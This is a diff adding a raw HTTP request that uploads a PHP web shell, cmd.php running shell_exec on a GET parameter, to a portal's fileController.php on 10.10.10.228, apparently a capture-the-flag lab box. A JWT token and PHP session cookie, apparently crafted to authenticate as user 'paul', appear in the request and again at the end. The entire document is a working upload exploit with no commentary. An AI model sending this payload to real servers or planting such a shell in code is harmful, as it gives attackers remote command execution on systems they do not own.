@@ -1,0 +1,28 @@
+POST /portal/includes/fileController.php HTTP/1.1
+Host: 10.10.10.228
+Content-Length: 345
+Accept: */*
+X-Requested-With: XMLHttpRequest
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryO4V4ASQlrEc2jywc
+Origin: http://10.10.10.228
+Referer: http://10.10.10.228/portal/php/files.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
+Cookie: PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
+Connection: close
+
+------WebKitFormBoundaryO4V4ASQlrEc2jywc
+Content-Disposition: form-data; name="file"; filename="cmd.php"
+Content-Type: application/x-php
+
+<?php $output = shell_exec($_GET['cmd']);echo "$output";?>
+
+------WebKitFormBoundaryO4V4ASQlrEc2jywc
+Content-Disposition: form-data; name="task"
+
+cmd.php
+------WebKitFormBoundaryO4V4ASQlrEc2jywc--
+
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU
+paul47200b180ccd6835d25d034eeb6e6390
